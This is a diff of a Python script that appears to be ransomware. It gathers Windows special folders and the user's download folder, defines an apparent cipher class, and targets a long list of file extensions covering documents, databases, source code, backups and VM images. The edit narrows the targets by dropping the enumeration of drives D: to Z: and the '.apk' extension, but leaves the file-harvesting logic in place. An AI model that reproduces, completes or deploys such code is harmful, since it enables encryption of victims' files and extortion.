@@ -1,4 +1,4 @@
-from PyQt5 import QtCore, QtGui, QtWidgets
+from PyQt5 import QtCore,  QtWidgets
 import sys
 import os
 import uuid
@@ -34,29 +34,21 @@ if sys.argv[0] != filepath:
 
 
 
-def disks():
-    part = []
 
-    for drive in range(ord('D'), ord('Z') + 1):
-        drive = chr(drive) + ':\\'
-        if os.path.exists(drive):
-            part.append(drive)
-    return part
  
 def getresource():
     b = ctypes.create_unicode_buffer(512)
-    c=[0,5,13,14,39,6]
+    c=[0,13,14,39,6]
     for x in c:
         ctypes.windll.shell32.SHGetSpecialFolderPathW(None, b, x, False)
         yield b.value
 
 if "download" in os.listdir(f"C:\\Users\\{use}"):
 
-    folder = list(getresource()) + disks() +[f"C:\\Users\\{use}\\download"]
+    folder = list(getresource()) +[f"C:\\Users\\{use}\\download"]
 else:
 
-    folder = list(getresource()) + disks()
-
+    folder = list(getresource()) 
 
 class cip:
     def __init__(self, file):
@@ -92,7 +84,7 @@ class listfile:
                       '.ppt','.pptx','.jpg','.png','.py','.gif','.mp4','.avi','.mkv','.wav','.zip','.rar','.jar','.db','.tar',
                       '.sql','.mdb','.bak','.old','.txt','.cpp','.js','.h','.cs','.bin','.webp','.mov','.wmv','.rtf',
                       '.gz','.odt','.e','.log','.ogg','.php','.go','.rs','.xml','.json','.yml','.css','.dll','.1cd','.ghost',
-                      '.vmx','.vmem','.vmdk','.apk','.obj','.pyd','.pyc','.bat','.csv','.swf','.flv','.ai','.psd','.wma','.aac',
+                      '.vmx','.vmem','.vmdk','.obj','.pyd','.pyc','.bat','.csv','.swf','.flv','.ai','.psd','.wma','.aac',
                       '.tif','.data','.jfif','.rdp']  
         result = []
         for root, _ ,files in os.walk(os.getcwd()):
